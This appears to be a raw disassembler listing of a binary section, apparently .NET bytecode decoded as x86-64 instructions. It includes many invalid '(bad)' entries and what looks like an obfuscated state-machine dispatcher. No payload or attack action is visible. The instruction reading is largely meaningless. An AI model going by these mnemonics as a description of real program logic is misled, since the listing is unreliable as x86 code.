  403016:	00 00                	add    %al,(%rax)
  403018:	0a 0a                	or     (%rdx),%cl
  40301a:	38 2b                	cmp    %ch,(%rbx)
  40301c:	00 00                	add    %al,(%rax)
  40301e:	00 73 2b             	add    %dh,0x2b(%rbx)
  403021:	00 00                	add    %al,(%rax)
  403023:	0a 0a                	or     (%rdx),%cl
  403025:	dd 20                	frstor (%rax)
  403027:	00 00                	add    %al,(%rax)
  403029:	00 26                	add    %ah,(%rsi)
  40302b:	72 03                	jb     0x403030
  40302d:	00 00                	add    %al,(%rax)
  40302f:	70 72                	jo     0x4030a3
  403031:	a2 00 00 70 28 4f 00 	movabs %al,0xa00004f28700000
  403038:	00 0a 
  40303a:	6f                   	outsl  (%rsi),(%dx)
  40303b:	50                   	push   %rax
  40303c:	00 00                	add    %al,(%rax)
  40303e:	0a 74 2c 00          	or     0x0(%rsp,%rbp,1),%dh
  403042:	00 01                	add    %al,(%rcx)
  403044:	0a dd                	or     %ch,%bl
  403046:	00 00                	add    %al,(%rax)
  403048:	00 00                	add    %al,(%rax)
  40304a:	06                   	(bad)
  40304b:	2a 01                	sub    (%rcx),%al
  40304d:	10 00                	adc    %al,(%rax)
  40304f:	00 00                	add    %al,(%rax)
  403051:	00 1b                	add    %bl,(%rbx)
  403053:	00 0b                	add    %cl,(%rbx)
  403055:	26 00 20             	es add %ah,(%rax)
  403058:	0c 00                	or     $0x0,%al
  40305a:	00 01                	add    %al,(%rcx)
  40305c:	0b 30                	or     (%rax),%esi
  40305e:	02 00                	add    (%rax),%al
  403060:	1a 00                	sbb    (%rax),%al
  403062:	00 00                	add    %al,(%rax)
  403064:	00 00                	add    %al,(%rax)
  403066:	00 00                	add    %al,(%rax)
  403068:	2b 02                	sub    (%rdx),%eax
  40306a:	26 16                	es (bad)
  40306c:	28 51 00             	sub    %dl,0x0(%rcx)
  40306f:	00 0a                	add    %cl,(%rdx)
  403071:	80 12 00             	adcb   $0x0,(%rdx)
  403074:	00 04 dd 06 00 00 00 	add    %al,0x6(,%rbx,8)
  40307b:	26 dd 00             	es fldl (%rax)
  40307e:	00 00                	add    %al,(%rax)
  403080:	00 2a                	add    %ch,(%rdx)
  403082:	00 00                	add    %al,(%rax)
  403084:	01 10                	add    %edx,(%rax)
  403086:	00 00                	add    %al,(%rax)
  403088:	00 00                	add    %al,(%rax)
  40308a:	04 00                	add    $0x0,%al
  40308c:	0f 13 00             	movlps %xmm0,(%rax)
  40308f:	06                   	(bad)
  403090:	0c 00                	or     $0x0,%al
  403092:	00 01                	add    %al,(%rcx)
  403094:	86 2b                	xchg   %ch,(%rbx)
  403096:	02 26                	add    (%rsi),%ah
  403098:	16                   	(bad)
  403099:	28 17                	sub    %dl,(%rdi)
  40309b:	00 00                	add    %al,(%rax)
  40309d:	06                   	(bad)
  40309e:	3a 0c 00             	cmp    (%rax,%rax,1),%cl
  4030a1:	00 00                	add    %al,(%rax)
  4030a3:	73 52                	jae    0x4030f7
  4030a5:	00 00                	add    %al,(%rax)
  4030a7:	0a 02                	or     (%rdx),%al
  4030a9:	28 53 00             	sub    %dl,0x0(%rbx)
  4030ac:	00 0a                	add    %cl,(%rdx)
  4030ae:	2a 02                	sub    (%rdx),%al
  4030b0:	28 11                	sub    %dl,(%rcx)
  4030b2:	00 00                	add    %al,(%rax)
  4030b4:	06                   	(bad)
  4030b5:	2a 00                	sub    (%rax),%al
  4030b7:	00 3e                	add    %bh,(%rsi)
  4030b9:	2b 02                	sub    (%rdx),%eax
  4030bb:	26 16                	es (bad)
  4030bd:	72 0e                	jb     0x4030cd
  4030bf:	01 00                	add    %eax,(%rax)
  4030c1:	70 6f                	jo     0x403132
  4030c3:	54                   	push   %rsp
  4030c4:	00 00                	add    %al,(%rax)
  4030c6:	0a 2a                	or     (%rdx),%ch
  4030c8:	1b 30                	sbb    (%rax),%esi
  4030ca:	06                   	(bad)
  4030cb:	00 48 3b             	add    %cl,0x3b(%rax)
  4030ce:	00 00                	add    %al,(%rax)
  4030d0:	07                   	(bad)
  4030d1:	00 00                	add    %al,(%rax)
  4030d3:	11 2b                	adc    %ebp,(%rbx)
  4030d5:	02 26                	add    (%rsi),%ah
  4030d7:	16                   	(bad)
  4030d8:	20 fc                	and    %bh,%ah
  4030da:	00 00                	add    %al,(%rax)
  4030dc:	00 38                	add    %bh,(%rax)
  4030de:	a2 03 00 00 fe 0c 2f 	movabs %al,0x20002f0cfe000003
  4030e5:	00 20 
  4030e7:	05 00 00 00 20       	add    $0x20000000,%eax
  4030ec:	21 00                	and    %eax,(%rax)
  4030ee:	00 00                	add    %al,(%rax)
  4030f0:	20 53 00             	and    %dl,0x0(%rbx)
  4030f3:	00 00                	add    %al,(%rax)
  4030f5:	58                   	pop    %rax
  4030f6:	9c                   	pushf
  4030f7:	20 3a                	and    %bh,(%rdx)
  4030f9:	01 00                	add    %eax,(%rax)
  4030fb:	00 fe                	add    %bh,%dh
  4030fd:	0e                   	(bad)
  4030fe:	33 00                	xor    (%rax),%eax
  403100:	17                   	(bad)
  403101:	3a 7a 03             	cmp    0x3(%rdx),%bh
  403104:	00 00                	add    %al,(%rax)
  403106:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  403109:	00 20                	add    %ah,(%rax)
  40310b:	00 00                	add    %al,(%rax)
  40310d:	00 00                	add    %al,(%rax)
  40310f:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  403112:	00 9c 20 50 01 00 00 	add    %bl,0x150(%rax,%riz,1)
  403119:	fe 0e                	decb   (%rsi)
  40311b:	33 00                	xor    (%rax),%eax
  40311d:	38 b1 37 00 00 3a    	cmp    %dh,0x3a000037(%rcx)
  403123:	00 1a                	add    %bl,(%rdx)
  403125:	00 00                	add    %al,(%rax)
  403127:	38 54 03 00          	cmp    %dl,0x0(%rbx,%rax,1)
  40312b:	00 fe                	add    %bh,%dh
  40312d:	0c 27                	or     $0x27,%al
  40312f:	00 20                	add    %ah,(%rax)
  403131:	15 00 00 00 20       	adc    $0x20000000,%eax
  403136:	e0 00                	loopne 0x403138
  403138:	00 00                	add    %al,(%rax)
  40313a:	20 4a 00             	and    %cl,0x0(%rdx)
  40313d:	00 00                	add    %al,(%rax)
  40313f:	59                   	pop    %rcx
  403140:	9c                   	pushf
  403141:	20 8a 00 00 00 38    	and    %cl,0x38000000(%rdx)
  403147:	39 03                	cmp    %eax,(%rbx)
  403149:	00 00                	add    %al,(%rax)
  40314b:	20 e0                	and    %ah,%al
  40314d:	00 00                	add    %al,(%rax)
  40314f:	00 20                	add    %ah,(%rax)
  403151:	4a 00 00             	rex.WX add %al,(%rax)
  403154:	00 59 fe             	add    %bl,-0x2(%rcx)
  403157:	0e                   	(bad)
  403158:	0c 00                	or     $0x0,%al
  40315a:	20 53 00             	and    %dl,0x0(%rbx)
  40315d:	00 00                	add    %al,(%rax)
  40315f:	fe 0e                	decb   (%rsi)
  403161:	33 00                	xor    (%rax),%eax
  403163:	17                   	(bad)
  403164:	3a 17                	cmp    (%rdi),%dl
  403166:	03 00                	add    (%rax),%eax
  403168:	00 20                	add    %ah,(%rax)
  40316a:	1f                   	(bad)
  40316b:	00 00                	add    %al,(%rax)
  40316d:	00 20                	add    %ah,(%rax)
  40316f:	67 00 00             	add    %al,(%eax)
  403172:	00 58 fe             	add    %bl,-0x2(%rax)
  403175:	0e                   	(bad)
  403176:	2b 00                	sub    (%rax),%eax
  403178:	20 75 01             	and    %dh,0x1(%rbp)
  40317b:	00 00                	add    %al,(%rax)
  40317d:	fe 0e                	decb   (%rsi)
  40317f:	33 00                	xor    (%rax),%eax
  403181:	38 57 37             	cmp    %dl,0x37(%rdi)
  403184:	00 00                	add    %al,(%rax)
  403186:	39 f5                	cmp    %esi,%ebp
  403188:	02 00                	add    (%rax),%al
  40318a:	00 fe                	add    %bh,%dh
  40318c:	0c 2f                	or     $0x2f,%al
  40318e:	00 20                	add    %ah,(%rax)
  403190:	0e                   	(bad)
  403191:	00 00                	add    %al,(%rax)
  403193:	00 fe                	add    %bh,%dh
  403195:	0c 1e                	or     $0x1e,%al
  403197:	00 9c 20 79 00 00 00 	add    %bl,0x79(%rax,%riz,1)
  40319e:	38 e1                	cmp    %ah,%cl
  4031a0:	02 00                	add    (%rax),%al
  4031a2:	00 fe                	add    %bh,%dh
  4031a4:	0c 2f                	or     $0x2f,%al
  4031a6:	00 20                	add    %ah,(%rax)
  4031a8:	0a 00                	or     (%rax),%al
  4031aa:	00 00                	add    %al,(%rax)
  4031ac:	20 79 00             	and    %bh,0x0(%rcx)
  4031af:	00 00                	add    %al,(%rax)
  4031b1:	20 50 00             	and    %dl,0x0(%rax)
  4031b4:	00 00                	add    %al,(%rax)
  4031b6:	58                   	pop    %rax
  4031b7:	9c                   	pushf
  4031b8:	20 b4 00 00 00 fe 0e 	and    %dh,0xefe0000(%rax,%rax,1)
  4031bf:	33 00                	xor    (%rax),%eax
  4031c1:	38 21                	cmp    %ah,(%rcx)
  4031c3:	37                   	(bad)
  4031c4:	00 00                	add    %al,(%rax)
  4031c6:	3a b5 02 00 00 fe    	cmp    -0x1fffffe(%rbp),%dh
  4031cc:	0c 27                	or     $0x27,%al
  4031ce:	00 20                	add    %ah,(%rax)
  4031d0:	08 00                	or     %al,(%rax)
  4031d2:	00 00                	add    %al,(%rax)
  4031d4:	20 c9                	and    %cl,%cl
  4031d6:	00 00                	add    %al,(%rax)
  4031d8:	00 20                	add    %ah,(%rax)
  4031da:	43 00 00             	rex.XB add %al,(%r8)
  4031dd:	00 59 9c             	add    %bl,-0x64(%rcx)
  4031e0:	20 13                	and    %dl,(%rbx)
  4031e2:	01 00                	add    %eax,(%rax)
  4031e4:	00 fe                	add    %bh,%dh
  4031e6:	0e                   	(bad)
  4031e7:	33 00                	xor    (%rax),%eax
  4031e9:	38 92 02 00 00 20    	cmp    %dl,0x20000002(%rdx)
  4031ef:	20 00                	and    %al,(%rax)
  4031f1:	00 00                	add    %al,(%rax)
  4031f3:	20 17                	and    %dl,(%rdi)
  4031f5:	00 00                	add    %al,(%rax)
  4031f7:	00 58 fe             	add    %bl,-0x2(%rax)
  4031fa:	0e                   	(bad)
  4031fb:	0c 00                	or     $0x0,%al
  4031fd:	20 08                	and    %cl,(%rax)
  4031ff:	00 00                	add    %al,(%rax)
  403201:	00 fe                	add    %bh,%dh
  403203:	0e                   	(bad)
  403204:	33 00                	xor    (%rax),%eax
  403206:	38 75 02             	cmp    %dh,0x2(%rbp)
  403209:	00 00                	add    %al,(%rax)
  40320b:	11 28                	adc    %ebp,(%rax)
  40320d:	17                   	(bad)
  40320e:	58                   	pop    %rax
  40320f:	13 28                	adc    (%rax),%ebp
  403211:	20 ba 00 00 00 fe    	and    %bh,-0x2000000(%rdx)
  403217:	0e                   	(bad)
  403218:	33 00                	xor    (%rax),%eax
  40321a:	17                   	(bad)
  40321b:	3a 60 02             	cmp    0x2(%rax),%ah
  40321e:	00 00                	add    %al,(%rax)
  403220:	20 6b 00             	and    %ch,0x0(%rbx)
  403223:	00 00                	add    %al,(%rax)
  403225:	20 49 00             	and    %cl,0x0(%rcx)
  403228:	00 00                	add    %al,(%rax)
  40322a:	59                   	pop    %rcx
  40322b:	fe 0e                	decb   (%rsi)
  40322d:	0c 00                	or     $0x0,%al
  40322f:	20 73 01             	and    %dh,0x1(%rbx)
  403232:	00 00                	add    %al,(%rax)
  403234:	38 43 02             	cmp    %al,0x2(%rbx)
  403237:	00 00                	add    %al,(%rax)
  403239:	7e 14                	jle    0x40324f
  40323b:	00 00                	add    %al,(%rax)
  40323d:	04 72                	add    $0x72,%al
  40323f:	42 01 00             	rex.X add %eax,(%rax)
  403242:	70 38                	jo     0x40327c
  403244:	a9 36 00 00 38       	test   $0x38000036,%eax
  403249:	ae                   	scas   (%rdi),%al
  40324a:	36 00 00             	ss add %al,(%rax)
  40324d:	13 20                	adc    (%rax),%esp
  40324f:	20 17                	and    %dl,(%rdi)
  403251:	01 00                	add    %eax,(%rax)
  403253:	00 38                	add    %bh,(%rax)
  403255:	2b 02                	sub    (%rdx),%eax
  403257:	00 00                	add    %al,(%rax)
  403259:	11 21                	adc    %esp,(%rcx)
  40325b:	17                   	(bad)
  40325c:	38 a4 36 00 00 20 40 	cmp    %ah,0x40200000(%rsi,%rsi,1)
  403263:	01 00                	add    %eax,(%rax)
  403265:	00 fe                	add    %bh,%dh
  403267:	0e                   	(bad)
  403268:	33 00                	xor    (%rax),%eax
  40326a:	38 a0 36 00 00 39    	cmp    %ah,0x39000036(%rax)
  403270:	0c 02                	or     $0x2,%al
  403272:	00 00                	add    %al,(%rax)
  403274:	fe 0c 27             	decb   (%rdi,%riz,1)
  403277:	00 20                	add    %ah,(%rax)
  403279:	0c 00                	or     $0x0,%al
  40327b:	00 00                	add    %al,(%rax)
  40327d:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  403280:	00 9c 20 3a 00 00 00 	add    %bl,0x3a(%rax,%riz,1)
  403287:	fe 0e                	decb   (%rsi)
  403289:	33 00                	xor    (%rax),%eax
  40328b:	38 f0                	cmp    %dh,%al
  40328d:	01 00                	add    %eax,(%rax)
  40328f:	00 11                	add    %dl,(%rcx)
  403291:	25 1f 09 11 19       	and    $0x1911091f,%eax
  403296:	1a 91 9c 20 e7 00    	sbb    0xe7209c(%rcx),%dl
  40329c:	00 00                	add    %al,(%rax)
  40329e:	38 d9                	cmp    %bl,%cl
  4032a0:	01 00                	add    %eax,(%rax)
  4032a2:	00 20                	add    %ah,(%rax)
  4032a4:	ae                   	scas   (%rdi),%al
  4032a5:	00 00                	add    %al,(%rax)
  4032a7:	00 20                	add    %ah,(%rax)
  4032a9:	3a 00                	cmp    (%rax),%al
  4032ab:	00 00                	add    %al,(%rax)
  4032ad:	59                   	pop    %rcx
  4032ae:	fe 0e                	decb   (%rsi)
  4032b0:	2b 00                	sub    (%rax),%eax
  4032b2:	20 2f                	and    %ch,(%rdi)
  4032b4:	00 00                	add    %al,(%rax)
  4032b6:	00 38                	add    %bh,(%rax)
  4032b8:	c8 01 00 00          	enter  $0x1,$0x0
  4032bc:	fe 0c 27             	decb   (%rdi,%riz,1)
  4032bf:	00 20                	add    %ah,(%rax)
  4032c1:	16                   	(bad)
  4032c2:	00 00                	add    %al,(%rax)
  4032c4:	00 20                	add    %ah,(%rax)
  4032c6:	75 00                	jne    0x4032c8
  4032c8:	00 00                	add    %al,(%rax)
  4032ca:	20 46 00             	and    %al,0x0(%rsi)
  4032cd:	00 00                	add    %al,(%rax)
  4032cf:	58                   	pop    %rax
  4032d0:	9c                   	pushf
  4032d1:	20 9e 01 00 00 38    	and    %bl,0x38000001(%rsi)
  4032d7:	a1 01 00 00 fe 0c 27 	movabs 0x2000270cfe000001,%eax
  4032de:	00 20 
  4032e0:	05 00 00 00 20       	add    $0x20000000,%eax
  4032e5:	80 00 00             	addb   $0x0,(%rax)
  4032e8:	00 20                	add    %ah,(%rax)
  4032ea:	2a 00                	sub    (%rax),%al
  4032ec:	00 00                	add    %al,(%rax)
  4032ee:	59                   	pop    %rcx
  4032ef:	9c                   	pushf
  4032f0:	20 13                	and    %dl,(%rbx)
  4032f2:	00 00                	add    %al,(%rax)
  4032f4:	00 fe                	add    %bh,%dh
  4032f6:	0e                   	(bad)
  4032f7:	33 00                	xor    (%rax),%eax
  4032f9:	38 82 01 00 00 20    	cmp    %al,0x20000001(%rdx)
  4032ff:	a9 00 00 00 20       	test   $0x20000000,%eax
  403304:	38 00                	cmp    %al,(%rax)
  403306:	00 00                	add    %al,(%rax)
  403308:	59                   	pop    %rcx
  403309:	fe 0e                	decb   (%rsi)
  40330b:	0c 00                	or     $0x0,%al
  40330d:	20 6d 01             	and    %ch,0x1(%rbp)
  403310:	00 00                	add    %al,(%rax)
  403312:	38 6d 01             	cmp    %ch,0x1(%rbp)
  403315:	00 00                	add    %al,(%rax)
  403317:	11 28                	adc    %ebp,(%rax)
  403319:	11 01                	adc    %eax,(%rcx)
  40331b:	3f                   	(bad)
  40331c:	b0 19                	mov    $0x19,%al
  40331e:	00 00                	add    %al,(%rax)
  403320:	20 ff                	and    %bh,%bh
  403322:	00 00                	add    %al,(%rax)
  403324:	00 fe                	add    %bh,%dh
  403326:	0e                   	(bad)
  403327:	33 00                	xor    (%rax),%eax
  403329:	16                   	(bad)
  40332a:	39 51 01             	cmp    %edx,0x1(%rcx)
  40332d:	00 00                	add    %al,(%rax)
  40332f:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  403332:	00 20                	add    %ah,(%rax)
  403334:	0a 00                	or     (%rax),%al
  403336:	00 00                	add    %al,(%rax)
  403338:	20 2b                	and    %ch,(%rbx)
  40333a:	00 00                	add    %al,(%rax)
  40333c:	00 20                	add    %ah,(%rax)
  40333e:	20 00                	and    %al,(%rax)
  403340:	00 00                	add    %al,(%rax)
  403342:	58                   	pop    %rax
  403343:	9c                   	pushf
  403344:	20 92 01 00 00 fe    	and    %dl,-0x1ffffff(%rdx)
  40334a:	0e                   	(bad)
  40334b:	33 00                	xor    (%rax),%eax
  40334d:	38 c7                	cmp    %al,%bh
  40334f:	35 00 00 3a 29       	xor    $0x293a0000,%eax
  403354:	01 00                	add    %eax,(%rax)
  403356:	00 20                	add    %ah,(%rax)
  403358:	7f 00                	jg     0x40335a
  40335a:	00 00                	add    %al,(%rax)
  40335c:	20 2a                	and    %ch,(%rdx)
  40335e:	00 00                	add    %al,(%rax)
  403360:	00 59 fe             	add    %bl,-0x2(%rcx)
  403363:	0e                   	(bad)
  403364:	0b 00                	or     (%rax),%eax
  403366:	20 d1                	and    %dl,%cl
  403368:	00 00                	add    %al,(%rax)
  40336a:	00 fe                	add    %bh,%dh
  40336c:	0e                   	(bad)
  40336d:	33 00                	xor    (%rax),%eax
  40336f:	38 af 35 00 00 3a    	cmp    %ch,0x3a000035(%rdi)
  403375:	07                   	(bad)
  403376:	01 00                	add    %eax,(%rax)
  403378:	00 fe                	add    %bh,%dh
  40337a:	0c 2f                	or     $0x2f,%al
  40337c:	00 20                	add    %ah,(%rax)
  40337e:	06                   	(bad)
  40337f:	00 00                	add    %al,(%rax)
  403381:	00 fe                	add    %bh,%dh
  403383:	0c 0b                	or     $0xb,%al
  403385:	00 9c 20 81 00 00 00 	add    %bl,0x81(%rax,%riz,1)
  40338c:	fe 0e                	decb   (%rsi)
  40338e:	33 00                	xor    (%rax),%eax
  403390:	38 eb                	cmp    %ch,%bl
  403392:	00 00                	add    %al,(%rax)
  403394:	00 11                	add    %dl,(%rcx)
  403396:	20 11                	and    %dl,(%rcx)
  403398:	20 38                	and    %bh,(%rax)
  40339a:	8f                   	(bad)
  40339b:	35 00 00 38 94       	xor    $0x94380000,%eax
  4033a0:	35 00 00 69 38       	xor    $0x38690000,%eax
  4033a5:	98                   	cwtl
  4033a6:	35 00 00 13 24       	xor    $0x24130000,%eax
  4033ab:	20 38                	and    %bh,(%rax)
  4033ad:	01 00                	add    %eax,(%rax)
  4033af:	00 38                	add    %bh,(%rax)
  4033b1:	c7 00 00 00 fe 0c    	movl   $0xcfe0000,(%rax)
  4033b7:	27                   	(bad)
  4033b8:	00 20                	add    %ah,(%rax)
  4033ba:	1e                   	(bad)
  4033bb:	00 00                	add    %al,(%rax)
  4033bd:	00 20                	add    %ah,(%rax)
  4033bf:	40 00 00             	rex add %al,(%rax)
  4033c2:	00 20                	add    %ah,(%rax)
  4033c4:	21 00                	and    %eax,(%rax)
  4033c6:	00 00                	add    %al,(%rax)
  4033c8:	58                   	pop    %rax
  4033c9:	9c                   	pushf
  4033ca:	20 3d 01 00 00 38    	and    %bh,0x38000001(%rip)        # 0x384033d1
  4033d0:	a8 00                	test   $0x0,%al
  4033d2:	00 00                	add    %al,(%rax)
  4033d4:	fe 0c 27             	decb   (%rdi,%riz,1)
  4033d7:	00 20                	add    %ah,(%rax)
  4033d9:	08 00                	or     %al,(%rax)
  4033db:	00 00                	add    %al,(%rax)
  4033dd:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4033e0:	00 9c 20 4f 01 00 00 	add    %bl,0x14f(%rax,%riz,1)
  4033e7:	fe 0e                	decb   (%rsi)
  4033e9:	33 00                	xor    (%rax),%eax
  4033eb:	38 90 00 00 00 20    	cmp    %dl,0x20000000(%rax)
  4033f1:	cb                   	lret
  4033f2:	00 00                	add    %al,(%rax)
  4033f4:	00 20                	add    %ah,(%rax)
  4033f6:	43 00 00             	rex.XB add %al,(%r8)
  4033f9:	00 59 fe             	add    %bl,-0x2(%rcx)
  4033fc:	0e                   	(bad)
  4033fd:	1e                   	(bad)
  4033fe:	00 20                	add    %ah,(%rax)
  403400:	5a                   	pop    %rdx
  403401:	00 00                	add    %al,(%rax)
  403403:	00 38                	add    %bh,(%rax)
  403405:	7b 00                	jnp    0x403407
  403407:	00 00                	add    %al,(%rax)
  403409:	fe 0c 27             	decb   (%rdi,%riz,1)
  40340c:	00 20                	add    %ah,(%rax)
  40340e:	11 00                	adc    %eax,(%rax)
  403410:	00 00                	add    %al,(%rax)
  403412:	20 6a 00             	and    %ch,0x0(%rdx)
  403415:	00 00                	add    %al,(%rax)
  403417:	20 3b                	and    %bh,(%rbx)
  403419:	00 00                	add    %al,(%rax)
  40341b:	00 59 9c             	add    %bl,-0x64(%rcx)
  40341e:	20 02                	and    %al,(%rdx)
  403420:	01 00                	add    %eax,(%rax)
  403422:	00 fe                	add    %bh,%dh
  403424:	0e                   	(bad)
  403425:	33 00                	xor    (%rax),%eax
  403427:	17                   	(bad)
  403428:	3a 53 00             	cmp    0x0(%rbx),%dl
  40342b:	00 00                	add    %al,(%rax)
  40342d:	fe 0c 27             	decb   (%rdi,%riz,1)
  403430:	00 20                	add    %ah,(%rax)
  403432:	07                   	(bad)
  403433:	00 00                	add    %al,(%rax)
  403435:	00 fe                	add    %bh,%dh
  403437:	0c 2b                	or     $0x2b,%al
  403439:	00 9c 20 0c 00 00 00 	add    %bl,0xc(%rax,%riz,1)
  403440:	38 3f                	cmp    %bh,(%rdi)
  403442:	00 00                	add    %al,(%rax)
  403444:	00 fe                	add    %bh,%dh
  403446:	0c 27                	or     $0x27,%al
  403448:	00 20                	add    %ah,(%rax)
  40344a:	1c 00                	sbb    $0x0,%al
  40344c:	00 00                	add    %al,(%rax)
  40344e:	20 4a 00             	and    %cl,0x0(%rdx)
  403451:	00 00                	add    %al,(%rax)
  403453:	20 1e                	and    %bl,(%rsi)
  403455:	00 00                	add    %al,(%rax)
  403457:	00 58 9c             	add    %bl,-0x64(%rax)
  40345a:	20 98 01 00 00 38    	and    %bl,0x38000001(%rax)
  403460:	20 00                	and    %al,(%rax)
  403462:	00 00                	add    %al,(%rax)
  403464:	fe 0c 27             	decb   (%rdi,%riz,1)
  403467:	00 20                	add    %ah,(%rax)
  403469:	1c 00                	sbb    $0x0,%al
  40346b:	00 00                	add    %al,(%rax)
  40346d:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  403470:	00 9c 38 e7 23 00 00 	add    %bl,0x23e7(%rax,%rdi,1)
  403477:	20 fc                	and    %bh,%ah
  403479:	00 00                	add    %al,(%rax)
  40347b:	00 fe                	add    %bh,%dh
  40347d:	0e                   	(bad)
  40347e:	33 00                	xor    (%rax),%eax
  403480:	fe 0c 33             	decb   (%rbx,%rsi,1)
  403483:	00 45 b0             	add    %al,-0x50(%rbp)
  403486:	01 00                	add    %eax,(%rax)
  403488:	00 dd                	add    %bl,%ch
  40348a:	17                   	(bad)
  40348b:	00 00                	add    %al,(%rax)
  40348d:	3b 08                	cmp    (%rax),%ecx
  40348f:	00 00                	add    %al,(%rax)
  403491:	8a 1d 00 00 d7 f6    	mov    -0x9290000(%rip),%bl        # 0xfffffffff7173497
  403497:	ff                   	(bad)
  403498:	ff 92 f7 ff ff 0c    	call   *0xcfffff7(%rdx)
  40349e:	04 00                	add    $0x0,%al
  4034a0:	00 f6                	add    %dh,%dh
  4034a2:	06                   	(bad)
  4034a3:	00 00                	add    %al,(%rax)
  4034a5:	99                   	cltd
  4034a6:	23 00                	and    (%rax),%eax
  4034a8:	00 4f 22             	add    %cl,0x22(%rdi)
  4034ab:	00 00                	add    %al,(%rax)
  4034ad:	00 1b                	add    %bl,(%rbx)
  4034af:	00 00                	add    %al,(%rax)
  4034b1:	58                   	pop    %rax
  4034b2:	28 00                	sub    %al,(%rax)
  4034b4:	00 63 1a             	add    %ah,0x1a(%rbx)
  4034b7:	00 00                	add    %al,(%rax)
  4034b9:	82                   	(bad)
  4034ba:	f6 ff                	idiv   %bh
  4034bc:	ff                   	(bad)
  4034bd:	be 14 00 00 77       	mov    $0x77000014,%esi
  4034c2:	24 00                	and    $0x0,%al
  4034c4:	00 51 17             	add    %dl,0x17(%rcx)
  4034c7:	00 00                	add    %al,(%rax)
  4034c9:	d9 01                	flds   (%rcx)
  4034cb:	00 00                	add    %al,(%rax)
  4034cd:	86 27                	xchg   %ah,(%rdi)
  4034cf:	00 00                	add    %al,(%rax)
  4034d1:	fa                   	cli
  4034d2:	21 00                	and    %eax,(%rax)
  4034d4:	00 bb 09 00 00 cc    	add    %bh,-0x33fffff7(%rbx)
  4034da:	18 00                	sbb    %al,(%rax)
  4034dc:	00 71 27             	add    %dh,0x27(%rcx)
  4034df:	00 00                	add    %al,(%rax)
  4034e1:	84 2a                	test   %ch,(%rdx)
  4034e3:	00 00                	add    %al,(%rax)
  4034e5:	19 24 00             	sbb    %esp,(%rax,%rax,1)
  4034e8:	00 9c 29 00 00 e7 28 	add    %bl,0x28e70000(%rcx,%rbp,1)
  4034ef:	00 00                	add    %al,(%rax)
  4034f1:	29 16                	sub    %edx,(%rsi)
  4034f3:	00 00                	add    %al,(%rax)
  4034f5:	fc                   	cld
  4034f6:	10 00                	adc    %al,(%rax)
  4034f8:	00 a3 2c 00 00 dd    	add    %ah,-0x22ffffd4(%rbx)
  4034fe:	10 00                	adc    %al,(%rax)
  403500:	00 a7 f8 ff ff 98    	add    %ah,-0x67000008(%rdi)
  403506:	0d 00 00 1f 12       	or     $0x121f0000,%eax
  40350b:	00 00                	add    %al,(%rax)
  40350d:	67 22 00             	and    (%eax),%al
  403510:	00 ee                	add    %ch,%dh
  403512:	27                   	(bad)
  403513:	00 00                	add    %al,(%rax)
  403515:	cd 0b                	int    $0xb
  403517:	00 00                	add    %al,(%rax)
  403519:	63 18                	movsxd (%rax),%ebx
  40351b:	00 00                	add    %al,(%rax)
  40351d:	0a 10                	or     (%rax),%dl
  40351f:	00 00                	add    %al,(%rax)
  403521:	b3 18                	mov    $0x18,%bl
  403523:	00 00                	add    %al,(%rax)
  403525:	d8 1f                	fcomps (%rdi)
  403527:	00 00                	add    %al,(%rax)
  403529:	82                   	(bad)
  40352a:	20 00                	and    %al,(%rax)
  40352c:	00 fc                	add    %bh,%ah
  40352e:	1c 00                	sbb    $0x0,%al
  403530:	00 c7                	add    %al,%bh
  403532:	05 00 00 73 15       	add    $0x15730000,%eax
  403537:	00 00                	add    %al,(%rax)
  403539:	4b 0d 00 00 26 00    	rex.WXB or $0x260000,%rax
  40353f:	00 00                	add    %al,(%rax)
  403541:	21 06                	and    %eax,(%rsi)
  403543:	00 00                	add    %al,(%rax)
  403545:	a6                   	cmpsb  (%rdi),(%rsi)
  403546:	14 00                	adc    $0x0,%al
  403548:	00 0e                	add    %cl,(%rsi)
  40354a:	02 00                	add    (%rax),%al
  40354c:	00 e3                	add    %ah,%bl
  40354e:	f5                   	cmc
  40354f:	ff                   	(bad)
  403550:	ff 5c 23 00          	lcall  *0x0(%rbx,%riz,1)
  403554:	00 6b 08             	add    %ch,0x8(%rbx)
  403557:	00 00                	add    %al,(%rax)
  403559:	fd                   	std
  40355a:	08 00                	or     %al,(%rax)
  40355c:	00 eb                	add    %ch,%bl
  40355e:	13 00                	adc    (%rax),%eax
  403560:	00 3f                	add    %bh,(%rdi)
  403562:	2c 00                	sub    $0x0,%al
  403564:	00 d7                	add    %dl,%bh
  403566:	2c 00                	sub    $0x0,%al
  403568:	00 6d 13             	add    %ch,0x13(%rbp)
  40356b:	00 00                	add    %al,(%rax)
  40356d:	ae                   	scas   (%rdi),%al
  40356e:	1e                   	(bad)
  40356f:	00 00                	add    %al,(%rax)
  403571:	a8 02                	test   $0x2,%al
  403573:	00 00                	add    %al,(%rax)
  403575:	d6                   	udb
  403576:	14 00                	adc    $0x0,%al
  403578:	00 68 0e             	add    %ch,0xe(%rax)
  40357b:	00 00                	add    %al,(%rax)
  40357d:	a3 1f 00 00 2e 2a 00 	movabs %eax,0x2400002a2e00001f
  403584:	00 24 
  403586:	0c 00                	or     $0x0,%al
  403588:	00 2c 29             	add    %ch,(%rcx,%rbp,1)
  40358b:	00 00                	add    %al,(%rax)
  40358d:	ac                   	lods   (%rsi),%al
  40358e:	17                   	(bad)
  40358f:	00 00                	add    %al,(%rax)
  403591:	c4                   	(bad)
  403592:	06                   	(bad)
  403593:	00 00                	add    %al,(%rax)
  403595:	ef                   	out    %eax,(%dx)
  403596:	03 00                	add    (%rax),%eax
  403598:	00 23                	add    %ah,(%rbx)
  40359a:	25 00 00 7b 28       	and    $0x287b0000,%eax
  40359f:	00 00                	add    %al,(%rax)
  4035a1:	73 19                	jae    0x4035bc
  4035a3:	00 00                	add    %al,(%rax)
  4035a5:	04 29                	add    $0x29,%al
  4035a7:	00 00                	add    %al,(%rax)
  4035a9:	b5 05                	mov    $0x5,%ch
  4035ab:	00 00                	add    %al,(%rax)
  4035ad:	69 17 00 00 03 18    	imul   $0x18030000,(%rdi),%edx
  4035b3:	00 00                	add    %al,(%rax)
  4035b5:	15 07 00 00 26       	adc    $0x26000007,%eax
  4035ba:	13 00                	adc    (%rax),%eax
  4035bc:	00 9c 05 00 00 6a 26 	add    %bl,0x266a0000(%rbp,%rax,1)
